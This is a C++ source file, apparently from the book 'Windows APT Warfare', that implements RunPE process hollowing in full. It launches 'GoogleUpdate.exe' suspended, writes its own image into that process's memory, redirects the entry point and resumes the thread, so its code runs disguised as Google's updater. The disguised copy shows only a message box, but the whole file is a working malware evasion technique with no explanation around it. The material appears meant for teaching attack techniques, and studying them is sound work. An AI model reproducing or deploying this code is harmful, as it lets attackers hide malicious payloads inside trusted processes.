/**
 * RunPE - Process Hollowing
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <stdio.h>
#include <iostream>
#include <windows.h>
#pragma warning (disable : 4996)

BYTE* MapFileToMemory(LPCSTR filename, LONGLONG &filelen)
{
	FILE *fileptr;
	BYTE *buffer;

	fileptr = fopen(filename, "rb");  // Open the file in binary mode
	fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
	filelen = ftell(fileptr);             // Get the current byte offset in the file
	rewind(fileptr);                      // Jump back to the beginning of the file

	buffer = (BYTE *)malloc((filelen + 1) * sizeof(char)); // Enough memory for file + \0
	fread(buffer, filelen, 1, fileptr); // Read in the entire file
	fclose(fileptr); // Close the file

	return buffer;
}


void RunPortableExecutable(const char *path, void* Image) {
	PROCESS_INFORMATION PI = {};
	STARTUPINFOA SI = {};
	CONTEXT* CTX;

	void* pImageBase; // Pointer to the image base
	IMAGE_NT_HEADERS* NtHeader = PIMAGE_NT_HEADERS((size_t)Image + PIMAGE_DOS_HEADER(Image)->e_lfanew);
	IMAGE_SECTION_HEADER* SectionHeader = PIMAGE_SECTION_HEADER((size_t)NtHeader + sizeof(*NtHeader));

	// Create a new instance of current process in suspended state, for the new image.
	if (CreateProcessA(path, 0, 0, 0, false, CREATE_SUSPENDED, 0, 0, &SI, &PI)) 
	{
		// Allocate memory for the context.
		CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
		CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

		if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
		{
			pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
				NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

			// File Mapping
			WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
			for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
				WriteProcessMemory
				(
					PI.hProcess, 
					LPVOID((size_t)pImageBase + SectionHeader[i].VirtualAddress),
					LPVOID((size_t)Image + SectionHeader[i].PointerToRawData), 
					SectionHeader[i].SizeOfRawData, 
					0
				);

			WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&pImageBase), 4, 0);
			CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
			SetThreadContext(PI.hThread, LPCONTEXT(CTX)); 
			ResumeThread(PI.hThread);
		}
	}
}


int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {

	char CurrentFilePath[MAX_PATH + 1];
	GetModuleFileNameA(0, CurrentFilePath, MAX_PATH);
	
	if (strstr(CurrentFilePath, "GoogleUpdate.exe")) {
		MessageBoxA(0, "We Cool?", "30cm.tw", 0);
		return 0;
	}

	LONGLONG len = -1;
	RunPortableExecutable("GoogleUpdate.exe", MapFileToMemory(CurrentFilePath, len));

	return 0;
}
